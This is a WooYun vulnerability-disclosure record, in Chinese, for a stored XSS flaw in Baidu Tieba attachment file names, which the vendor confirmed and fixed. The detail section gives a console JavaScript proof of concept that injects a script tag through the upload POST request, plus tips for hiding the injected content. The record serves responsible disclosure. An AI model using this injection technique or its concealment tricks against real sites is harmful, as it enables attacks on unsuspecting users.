{"id": 13276, "wybug_id": "wooyun-2013-019814", "wybug_title": "百度贴吧附件xss", "wybug_corp": "百度", "wybug_author": "dtc", "wybug_date": "2013-03-10 00:02", "wybug_open_date": "2013-04-24 00:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-03-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-24：\t细节向公众公开  简要描述： 百度贴吧上传文件名未严格转码导致xss 详细说明：  上传的附件在源代码里查看信息发现，“转存到百度云”一项的data-file-name未进行转码，可以在其中插入代码，打开帖子时自动执行。   漏洞证明：  上传文件信息的基本脚本:javascript:var c=rich_postor._getData();c.files='[{\"name\":\"name\",\"size\":1,\"uploadStatus\":\"success\",\"path\":\"文件路径\",\"ctime\":0,\"mtime\":0,\"md5\":\"0\",\"fs_id\":0,\"isdir\":0,\"request_id\":0}]';$.post(\"/f/commit/thread/add\",c);一堆数据由于不影响上传干脆全清零了。然后文件名输入\"><script>alert(1)</script><a \"，随便上传一个1.jpg来检验于是得到代码\njavascript:var c=rich_postor._getData();c.files='[{\"name\":\"\\\\\"><script>alert(1)</script><a \\\\\"\",\"size\":1,\"uploadStatus\":\"success\",\"path\":\"/1.jpg\",\"ctime\":0,\"mtime\":0,\"md5\":\"0\",\"fs_id\":0,\"isdir\":0,\"request_id\":0}]';$.post(\"/f/commit/thread/add\",c);\n加反斜杠来防止百度处理files时出错效果：\n\n源代码里的信息：\n\n可以在文件名的前二十个字符打满其他内容来隐蔽也可以在其中加入<style>.file_area{display:none}</style>来增强隐蔽性。。   ---by 8q   修复方案：  。   版权声明：转载请注明来源 dtc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-03-11 13:20 厂商回复： 感谢提交，该漏洞已修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-10 00:42 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  难道又是附件的头文件判断的问题？    \n     2013-03-10 01:02 |    \t\tretaker \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | free open share)\t\t \n  @px1624 是附件名的问题这么快就通过了，等着看rank。趁着没死赶紧玩    \n     2013-03-10 09:35 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @retaker ...我了个擦，不会是那种直接判断后缀的那种么？还是直接post修改附件名字。。。    \n     2013-03-10 09:43 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  @px1624 post修改文件名    \n     2013-03-10 10:12 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  。。。怪了，本来应该是双反斜杠的，然后预览一下看见是4个反斜杠，于是就打了一个反斜杠在预览里看到2个正好结果发上来又只有一个了。。。    \n     2013-03-10 10:27 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  算了。。反正还能编辑    \n     2013-03-10 11:23 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  社区好像早有了    \n     2013-03-10 12:20 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  @erevus 乌云社区？木有号T.T    \n     2013-03-10 13:53 |    \t\tYouTube \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | YouTube是世界上最大的视频分享网站，早期...)\t\t \n  目测已失效    \n     2013-03-10 13:54 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  @YouTube 仍未    \n     2013-03-10 16:01 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  = =已经被大范围利用了，百度速速修复啊。。。    \n     2013-03-10 17:38 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @dtc  未确认前，你就不该说的太细了，囧    \n     2013-03-10 17:42 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  @zeracker = =看到附件可xss，一般来说都会知道该怎么做了吧。。    \n     2013-03-10 18:04 |    \t\t李白 \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:29        )\t\t \n  @dtc 尼玛，都让我不敢上百度了。    \n     2013-03-10 18:20 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  @李白 别点来历不明的附件贴就行了    \n     2013-03-10 20:18 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  @dtc 直接用wooyun号登陆    \n     2013-05-19 17:39 |    \t\t帕秋莉 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 私はあなたを杀す wwwwww)\t\t \n  这玩意已经疯狂利用了. @xsser 目测贴吧又出现了 =皿=    \n     2013-05-19 20:03 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  @帕秋莉 这次是利用转帖来自动运行。。不过性质差不多。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}